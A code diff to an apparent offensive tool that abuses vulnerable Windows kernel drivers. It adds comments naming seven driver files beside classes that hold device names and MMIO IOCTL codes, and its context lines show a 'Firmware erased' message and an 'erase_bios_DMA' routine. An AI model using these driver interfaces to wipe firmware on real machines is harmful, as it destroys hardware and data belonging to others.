@@ -281,7 +281,7 @@ class VulDrv(metaclass=ABCMeta):
         if (hsfs.value & V_FDONE) and not (hsfs.value & V_SCIP):
             success('Firmware erased')
             
-class AMD(VulDrv):
+class AMD(VulDrv): # PDFWKRNL.sys
 
     DEV_NAME = br'\\.\PdFwKrnl'
     IOCTL_MMIO_READ = 0x80002000
@@ -331,7 +331,7 @@ class BufPhxHead(LittleEndianStructure): # because we can't refer to this from i
         ('check2', ULARGE_INTEGER)  # 0x338D098155A1B785
     ]
 
-class PHX(VulDrv):
+class PHX(VulDrv): # TdkLib64.sys
 
     DEV_NAME = br'\\.\TdkLib'
     IOCTL_MMIO_READ = 0x2221D8
@@ -444,7 +444,7 @@ class DELL(VulDrv): # only device access
     def mmio_dword(self, ioctl_code, paddr, data_value=None):
         raise NotImplementedError()
 
-class MOY(VulDrv):
+class MOY(VulDrv): # phymem_ext64.sys
 
     DEV_NAME = br'\\.\PhyMem2'
     IOCTL_MMIO_READ = 0x80002000
@@ -489,7 +489,7 @@ class MOY(VulDrv):
 
         self.erase_bios_DMA(bar)
 
-class RTIF(VulDrv):
+class RTIF(VulDrv): # rtif.sys
 
     DEV_NAME = br'\\.\rtif'
     IOCTL_MMIO_READ = 0x80992038
@@ -537,7 +537,7 @@ class RTIF(VulDrv):
 
         self.erase_bios_DMA(bar)
 
-class INTEL(VulDrv):
+class INTEL(VulDrv): # stdcdrv64.sys
 
     DEV_NAME = br'\\.\stdcdrv64'
     IOCTL_MMIO_READ = 0x222408
@@ -581,7 +581,7 @@ class INTEL(VulDrv):
 
         return result.value
 
-class NMS(VulDrv):
+class NMS(VulDrv): # cg6kwin2k.sys
 
     DEV_NAME = br'\\.\CG6K'
     IOCTL_MMIO_READ = 0x80012F18
@@ -627,7 +627,7 @@ class NMS(VulDrv):
 
         return None if data_value is not None else buf.paddr_then_res
 
-class INTEL2(VulDrv):
+class INTEL2(VulDrv): # IoAccess.sys
 
     DEV_NAME = br'\\.\IoAccess'
     IOCTL_MMIO_READ = 0x9C40E080 # get user-mode mapped page
